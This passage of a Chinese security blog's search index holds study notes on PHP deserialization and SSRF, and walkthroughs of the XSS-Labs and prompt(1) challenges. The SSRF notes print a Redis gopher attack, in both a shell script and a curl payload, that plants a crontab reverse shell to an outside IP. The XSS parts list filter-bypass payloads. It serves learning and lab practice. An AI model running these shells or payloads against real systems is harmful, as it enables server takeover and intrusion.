的字节流，可以存储于任何地方。 unserialize — 从已存储的表示中创建 PHP 的值 unserialize(string $str): mixed unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 ","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["Web安全","CTF"],"title":"安全牛反序列化学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x01 魔术方法 PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods) __construct，构造函数，PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __toString，打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。 __destruct，析构函数，PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，如C++。析构函数 会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __construct和__destruct会在对象创建或者销毁时自动调用。 __sleep magic方法在一个对象被序列化的时候调用。 __wakeup magic方法在一个对象被反序列化的时候调用。 ","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["Web安全","CTF"],"title":"安全牛反序列化学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x02 序列化注意点 \\x00 + 类名+ \\x00 + 变量名反序列化出来的是private变量, \\x00 + * + \\x00 + 变量名反序列化出来的是protected变量 直接变量名反序列化出来的是public变量 有时候+号会被识别为空格，需要通过url编码来绕过。 PHP Bug 72663 简单来说就是当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup的执行。 ","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["Web安全","CTF"],"title":"安全牛反序列化学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x03 session序列化以及phar序列化 Php bug 71101 https://bugs.php.net/bug.php?id=71101 PHP 内置了多种处理器用于存取$_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式。 PHP 提供了session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器。 session.serialize_handler “php” PHP_INI_ALL 如果PHP 在反序列化存储的$_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。 范例 当存储是php_serialize处理，然后调用时php去处理\r如果这时候注入的数据是a=|O:4:\"test\":0:{}\r那么session中的内容是a:1:{s:1:\"a\";s:16:\"|O:4:\"test\":0:{}\";}\r根据解释,其中a:1:{s:1:\"a\";s:16:\"在经过php解析后是被看成键名,\r后面就是一个实例化test对象的注入\r当配置选项session.auto_start＝Off，两个脚本注册Session会话时使用的序列化处理器不同，就会出现安全问题。 当配置选项session.auto_start＝On，会自动注册Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在session.auto_start＝On 时，销毁自动生成的Session 会话，然后设置需要的序列化处理器，再调用session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与php.ini 中设置的不同，就会出现安全问题。 phar序列化 在Blackhat2018，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Meta data信息会被反序列化。https://blog.ripstech.com/2018/new-php-exploitation-technique/ 可利用函数 ìnclude()、 fopen()、 file_get_contents()、 file()\rfile_exists($_GET['file']);\rmd5_file($_GET['file']);\rfilemtime($_GET['file']);\rfilesize($_GET['file']); ","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["Web安全","CTF"],"title":"安全牛反序列化学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Web安全","CTF"],"title":"安全牛SSRF学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x00 SSRF介绍 SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。对外发起网络请求的地方都可能存在SSRF漏洞。 SSRF的危害： 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息 攻击运行在内网或本地的应用程序（比如溢出） 对内网Web应用进行指纹识别，通过访问默认文件实现 攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等） 利用File协议读取本地文件 漏洞判断: 回显 延时 DNS请求 ","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["Web安全","CTF"],"title":"安全牛SSRF学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x01 相关php函数 file_get_contents — 将整个文件读入一个字符串。如果要打开有特殊字符的 URL （比如说有空格），就需要进行 URL 编码。 范例： \u003c?php\rif (isset($_POST['ur1']))\r{\r$content= file_get_contents($_POST['url']);\r$filename ='./images/'.rand().'jpg';\rfile_ put_contents($filename,$content);\recho $_POST['url'];\r$img =\"\u003cimg src=\\\"\".$filename.\"\\\"/\u003e\"；\recho $img;\r}\relse\r{\recho\"no url\";\r}\r?\u003e\rfsockopen — 打开一个网络连接或者一个Unix套接字连接。初始化一个套接字连接到指定主机（hostname）。 范例： \u003c?php\r$url = $_POST['url'];\r$port = $_POST['port'];\r$fp = fsockopen($url, $port, $errno, $errstr,30);\rif(!$fp){\recho \"$errstr($errno)\u003cbr /\u003e\\n\";\r}\relse{\r$out = \"GET / HTTP/1.1\\r\\n\";\r$out .= \"Host:www.example.com\\r\\n\";\r$out .= \"Connection: Close\\r\\n\\r\\n\";\rfwrite($fp, $out);\rwhile(!feof($fp)){\recho fgets($fp, 128);\r} fclose($fp);\r}\r#url=127.0.0.1\u0026port=3308\r?\u003e\rcurl_exec — 执行 cURL 会话 phpinfo中curl-protocols会显示支持的协议有哪些。 ","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["Web安全","CTF"],"title":"安全牛SSRF学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x02 ip限制绕过及gopher对redis的利用 绕过技巧 添加端口//127.0.0.1:80\r短网址//例如在http://45.xcyqz.cn/试验\r指向任意IP的域名,比如：xip.io、sslip.io、nip.io、\r不同进制组合转换\r//127.0.0.1--\u003e八进制0177.0.0.1--\u003e十六进制0x7f.0.0.1/0x7f000001--\u003e十进制2130706433\rgopher是一个互联网上使用的分布型的文件搜集获取网络协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议。（俗称万能协议） gopher协议的格式：gopher://host:port/_+数据流 如果不指定端口，默认端口为70端口 数据流要求全部进行url编码，并且以\\r\\n换行也就说以%0D%0A换行 Gopher对Redis的利用 Redis是一个key-value存储系统,支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，Redis支持各种不同方式的排序。为了保证效率，数据都是缓存在内存中。Redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。参考https://www.cnblogs.com/twosmi1e/p/13308682.html 常用命令 set testkey \"Hello World\" # 设置键testkey的值为字符串Hello World\rget testkey # 获取键testkey的内容\rSET score 99 # 设置键score的值为99\rINCR score # 使用INCR命令将score的值增加1\rGET score # 获取键score的内容\rkeys * # 列出当前数据库中所有的键\rget anotherkey # 获取一个不存在的键的值\rconfig set dir /home/test # 设置工作目录\rconfig set dbfilename redis.rdb # 设置备份文件名\rconfig get dir # 检查工作目录是否设置成功\rconfig get dbfilename # 检查备份文件名是否设置成功\rsave # 进行一次备份操作\rflushall # 删除所有数据\rdel key # 删除键为key的数据\rRedis是不区分命令的大小写的，当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)。\r利用条件Redis没有密码 首先在crontab里写定时任务，反弹shell，bash -i \u003e\u0026 表示创建一个交互式的bash shell到，/dev/tcp/xxx是一个特殊的文件，凡是尝试对该文件读或者写的操作，都会导致该文件发起一个socket连接，/dev/tcp/ip地址/端口 相当于创建了一个tcp套接字去连接IP地址:端口。0\u003e\u00261 表示将标准输入重定向到文件描述符为1的文件中，即将标准输入重定向到标准输出； 配置数据库文件夹路径，每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面。 设置数据库文件名为root 备份 退出 Shell脚本： echo -e \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/106.12.37.37/2333 0\u003e\u00261\\n\\n\"|redis-cli -h $1 -p $2 -x set 1 redis-cli -h $1 -p $2 config set dir /var/spool/cron/ redis-cli -h $1 -p $2 config set dbfilename root redis-cli -h $1 -p $2 save\rredis-cli -h $1 -p $2 quit\r-h 服务器地址 -p 端口号\r比如说中间人端口为4444，启动中间人代理，socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 格式转换脚本 curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a %0a%0a*/1 * * * * bash -i \u003e\u0026 /dev/tcp/127.0.0.1/2333 0\u003e\u00261%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d% 0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0 aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0 d%0a*1%0d%0a$4%0d%0aquit%0d%0a' 需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度 需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度 为58个字节，上面的EXP即是%0a%0a%0a*/1 * * * * bash -i \u003e\u0026 /dev/tcp/127.0.0.1/2333 0\u003e\u00261%0a%0a%0a%0a，3+51+4=58。如果想换成 42.256.24.73，那么$58需要改成$61，以此类推就行。 ","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["Web安全","CTF"],"title":"安全牛SSRF学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x03 Gopher对Mysql的利用 利用条件：Mysql 无密码 常规操作：登入数据库-\u003e获取数据 协议转化: gopher://127.0.0.1:3306/_ +url编码的登录请求\r+包长度\r+%00%00%00%03\r+查询语句(url编码)\r+%01%00%00%00%01\r请求的接口：curl（绕过系统，命令执行）、php-curl（ssrf）。 工具：https://hub.fastgit.org/tarunkant/Gopherus ","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["Web安全","CTF"],"title":"安全牛SSRF学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术"],"content":"Level1 url/?name=\u003cscript\u003ealert(1)\u003c/script\u003e\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:1:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level2 考察符号的闭合 url/?keyword='\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:2:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level3 htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。考察过滤\u003c、\u003e、“等的绕过。 url?keyword=' autofocus onfocus=alert(1)//\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:3:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level4 会删除掉\u003c和\u003e $str2=str_replace(\"\u003e\",\"\",$str);\r$str3=str_replace(\"\u003c\",\"\",$str2);\r和上一关类似，构造 url/?keyword=\" autofocus onmouseover=alert(1)//\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:4:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level5 这关会先全部转成小写，然后替换掉\u003cscript和on。 $str = strtolower($_GET[\"keyword\"]);\r$str2=str_replace(\"\u003cscript\",\"\u003cscr_ipt\",$str);\r$str3=str_replace(\"on\",\"o_n\",$str2);\r利用a标签的href属性执行javascript:伪协议来绕过 url/?keyword=\"\u003e\u003ca href='javascript:alert(1)'\u003e\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:5:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level6 替换多种关键字。 $str2=str_replace(\"\u003cscript\",\"\u003cscr_ipt\",$str);\r$str3=str_replace(\"on\",\"o_n\",$str2);\r$str4=str_replace(\"src\",\"sr_c\",$str3);\r$str5=str_replace(\"data\",\"da_ta\",$str4);\r$str6=str_replace(\"href\",\"hr_ef\",$str5);\r利用大写绕过。 ?keyword=\"\u003e\u003cScript\u003ealert(1)\u003c/script\u003e\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:6:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level7 先都转成小写， 再删除多种关键字。 $str =strtolower( $_GET[\"keyword\"]);\r$str2=str_replace(\"script\",\"\",$str);\r$str3=str_replace(\"on\",\"\",$str2);\r$str4=str_replace(\"src\",\"\",$str3);\r$str5=str_replace(\"data\",\"\",$str4);\r$str6=str_replace(\"href\",\"\",$str5);\r利用双写来绕过 url/?keyword=\"\u003e\u003cscrscriptipt\u003ealert(1)\u003c/scrscriptipt\u003e\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:7:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level8 与上一题相比，加入了对双引号的过滤，同时对关键字进行替换。 $str = strtolower($_GET[\"keyword\"]);\r$str2=str_replace(\"script\",\"scr_ipt\",$str);\r$str3=str_replace(\"on\",\"o_n\",$str2);\r$str4=str_replace(\"src\",\"sr_c\",$str3);\r$str5=str_replace(\"data\",\"da_ta\",$str4);\r$str6=str_replace(\"href\",\"hr_ef\",$str5);\r$str7=str_replace('\"','\"',$str6);\r考虑编码绕过。可以用如下的payload： java\u0026#115;cript:alert(1) java\u0026#x73;cript:alert(1) java\u0026#x0073;cript:alert(1) \u0026#106;\u0026#97;\u0026#118;\u0026#97;\u0026#115;\u0026#99;\u0026#114;\u0026#105;\u0026#112;\u0026#116;\u0026#58;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026#40;\u0026#49;\u0026#41; ","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:8:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level9 strpos 查找 ‘http://‘在字符串中第一次出现的位置。 if(false===strpos($str7,'http://'))\r{\recho '\u003ccenter\u003e\u003cBR\u003e\u003ca href=\"您的链接不合法？有没有！\"\u003e友情链接\u003c/a\u003e\u003c/center\u003e';\r}\r结合上一关的思想，可以构造如下的payload： 利用注释1：javascript:alert(1)//http://\r利用注释2：javascript:alert(1)/*http://*/\r利用回车符%0d：javascript:%0d/http://%0dalert(1)\r利用换行符%0a：javascript:%0a/http://%0aalert(1)\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:9:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level10 $str = $_GET[\"keyword\"];\r$str11 = $_GET[\"t_sort\"];\r$str22=str_replace(\"\u003e\",\"\",$str11);\r$str33=str_replace(\"\u003c\",\"\",$str22);\r构造payload，使得input框显现，或者编辑html。 t_sort=\"type=\"text\" onclick=\"alert(1)\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:10:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Less11 $str11=$_SERVER['HTTP_REFERER'];\r$str22=str_replace(\"\u003e\",\"\",$str11);\r$str33=str_replace(\"\u003c\",\"\",$str22);\r利用bp抓包，构造 Referer:\"type=\"text\" onclick=\"alert(1)\"\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:11:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level12 $str11=$_SERVER['HTTP_USER_AGENT'];\r$str22=str_replace(\"\u003e\",\"\",$str11);\r$str33=str_replace(\"\u003c\",\"\",$str22);\r利用bp构造USER_AGENT User-Agent:\"type=\"text\" onclick=\"alert(1)\"\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:12:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level13 setcookie(\"user\", \"call me maybe?\", time()+3600);\r$str11=$_COOKIE[\"user\"];\r$str22=str_replace(\"\u003e\",\"\",$str11);\r$str33=str_replace(\"\u003c\",\"\",$str22);\r这次是构造cookie Cookie:user=\"type=\"text\" onclick=\"alert(1)\";\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:13:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level14 本关因iframe调用的文件地址失效，无法进行测试。https://www.hackersb.cn/hacker/140.html ","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:14:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level15 看了大佬的博客才知道，是考察angular js中的ng-include问题，ng-include 指令用于包含外部的HTML文件。包含的内容将作为指定元素的子节点。ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一域名下。 构造src='level1.php?name=\u003cimg src=x onerror=alert(1)\u003e' ","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:15:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level16 替换空格、Tab、/符号。 $str = strtolower($_GET[\"keyword\"]);\r$str2=str_replace(\"script\",\" \",$str);\r$str3=str_replace(\" \",\" \",$str2);\r$str4=str_replace(\"/\",\" \",$str3);\r$str5=str_replace(\" \",\" \",$str4);\recho \"\u003ccenter\u003e\".$str5.\"\u003c/center\u003e\";\r可以用%0a或%0d绕过。 url/?keyword=\u003cimg%0a\rsrc=a%0a\ronerror=alert(1)\u003e\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:16:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level17 echo \"\u003cembed src=xsf01.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%\u003e\"; \u003cembed\u003e标签就是引入一个swf文件到浏览器端(火狐不支持swf) url/?arg01=1\u0026arg02= onmouseover=alert(1)\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:17:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level18 和上一题一样 ","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:18:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Less19 这一关涉及一种xss攻击手段叫做flash xss，学习参考https://cloud.tencent.com/developer/article/1089548。要判断是否属于flash xss，需要对引用的swf文件进行反编译然后进行源码分析，安装https://github.com/jindrapetrik/jpexs-decompiler/releases/tag/version14.4.0。 Flash产生的xss问题主要有两种方式：1、加载第三方资源；2、与javascript通信引发xss。 常见Flash xss危险函数总结\rFlash提供相关的函数，可以执行js代码，getURL(AS2中支持)，navigateToURL(AS3中支持)。 ExternalInterface.call同样是一个Flash提供的可以执行js的接口函数， 它有两个参数，形如ExternalInterface.call(\"函数名\",\"参数1\")，Flash最后执行的JS代码是try { __Flash__toXML(函数名(\"参数1\")) ; } catch (e) { \"\u003cundefined/\u003e\"; }。 htmlText，Flash支持在Flash里内嵌html，支持的标签img标签，a标签等。 img标签可以通过src参数引入一个Flash文件，类似与XSF一样。 addcallback与lso结合，这个问题出现的点在addCallback声明的函数，在被html界面js执行之后的返回值攻击者可控，导致了xss问题。使用lso中首先会setlso，写入脏数据，然后getlso获取脏数据。 跨站Flash即XSF，通过AS加载第三方的Flash文件，如果这个第三方Flash可以被控制，就可以实现XSF。 在AS2中使用loadMove函数等加载第三方Flash。 开始复现 参考：https://www.jianshu.com/p/4e3a517bc4ea，首先导入xsf03.swf文件，然后定位getURL函数。 追踪到sIFR的内容 得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL只在内容为link时打开，所以分析contentIsLink函数。 function contentIsLink() { return this.content.indexOf(\"\u003ca \") == 0 \u0026\u0026 (this.content.indexOf(\"\u003ca \") == this.content.lastIndexOf(\"\u003ca \") \u0026\u0026 this.content.indexOf(\"\u003c/a\u003e\") == this.content.length - 4); } 所以可以通过构造\u003ca\u003e标签来传值。payload如下： url?arg01=version\u0026arg02=\u003ca href=\"javascript:alert(1)\"\u003e1\u003c/a\u003e\r","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:19:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"Level20 不会。。。先埋个坑吧。。。 ","date":"2021-04-04","objectID":"/2021-04-04-xss-labs/:20:0","tags":["Web安全","XSS"],"title":"XSS-Labs","uri":"/2021-04-04-xss-labs/"},{"categories":["安全技术"],"content":"http://prompt.ml ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:0:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x00 function escape(input) {\r// warm up\r// script should be executed without user interaction\rreturn '\u003cinput type=\"text\" value=\"' + input + '\"\u003e';\r} 简单闭合下，构造\"\u003e\u003cscript\u003eprompt(1);\u003c/script\u003e ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:1:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x01 function escape(input) {\r// tags stripping mechanism from ExtJS library\r// Ext.util.Format.stripTags\rvar stripTagsRE = /\u003c\\/?[^\u003e]+\u003e/gi;\rinput = input.replace(stripTagsRE, '');\rreturn '\u003carticle\u003e' + input + '\u003c/article\u003e';\r} 可以用换行或者注释绕过，构造\u003csvg/onload=prompt(1)// ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:2:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x02 function escape(input) {\r// v-- frowny face\rinput = input.replace(/[=(]/g, '');\r// ok seriously, disallows equal signs and open parenthesis\rreturn input;\r} 可以构造如下的payload： \u003cscript\u003eeval.call`${'prompt\\x281)'}`\u003c/script\u003e \u003cscript\u003eprompt.call`${1}`\u003c/script\u003e\r\u003csvg\u003e\u003cscript\u003eprompt(1)\u003c/script\u003e\r......\r","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:3:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x03 function escape(input) {\r// filter potential comment end delimiters\rinput = input.replace(/-\u003e/g, '_');\r// comment the input to avoid script execution\rreturn '\u003c!-- ' + input + ' --\u003e';\r} 绕过闭合注释，--!\u003e\u003csvg/onload=prompt(1)\u003e ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:4:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x04 function escape(input) {\r// make sure the script belongs to own site\r// sample script: http://prompt.ml/js/test.js\rif (/^(?:https?:)?\\/\\/prompt\\.ml\\//i.test(decodeURIComponent(input))) {\rvar script = document.createElement('script');\rscript.src = input;\rreturn script.outerHTML;\r} else {\rreturn 'Invalid resource.';\r}\r} 在本地将prompt(1)写入1.js，/ 是不允许的。考虑到这里的正则特性和decodeURIComponent函数，所以可以使用%2f绕过。最后构造http://prompt.ml/@localhost/1.js ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:5:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x05 function escape(input) {\r// apply strict filter rules of level 0\r// filter \"\u003e\" and event handlers\rinput = input.replace(/\u003e|on.+?=|focus/gi, '_');\rreturn '\u003cinput value=\"' + input + '\" type=\"text\"\u003e';\r} 构造如下payload \" type=\"image\" src=# onerror\r=prompt(1) \"\r","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:6:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x06 function escape(input) {\r// let's do a post redirection\rtry {\r// pass in formURL#formDataJSON\r// e.g. http://httpbin.org/post#{\"name\":\"Matt\"}\rvar segments = input.split('#');\rvar formURL = segments[0];\rvar formData = JSON.parse(segments[1]);\rvar form = document.createElement('form');\rform.action = formURL;\rform.method = 'post';\rfor (var i in formData) {\rvar input = form.appendChild(document.createElement('input'));\rinput.name = i;\rinput.setAttribute('value', formData[i]);\r}\rreturn form.outerHTML + ' \\n\\\r\u003cscript\u003e \\n\\\r// forbid javascript: or vbscript: and data: stuff \\n\\\rif (!/script:|data:/i.test(document.forms[0].action)) \\n\\\rdocument.forms[0].submit(); \\n\\\relse \\n\\\rdocument.write(\"Action forbidden.\") \\n\\\r\u003c/script\u003e \\n\\\r';\r} catch (e) {\rreturn 'Invalid form data.';\r}\r} 先输入范例，查看下效果 这道题是考察表单提交action过滤，这里参考大佬们的答案进行整理。题目构造post表单，我们需要输入的格式为formURL#formDataJSON，具体过程是先提取formURL构造form表单，formURL赋值给form标签中的action，然后post内容构造input标签。 想嵌入代码，经常能见到类似action=”javascript:alert(1)”的内容，但是后面还过滤了document.form[0].action内容，过滤了script和data字符。 但是过滤存在缺陷，由于存在子级tag，action 将会优先指向name为action的子tag。所以我们在构造payload时，可以将input标签的name属性值设置为action，这样document.form[0].action指向的就不是form标签中的action了，因此过滤也就不起作用了。payload：javascript:prompt(1)#{\"action\":\"Matt\"} 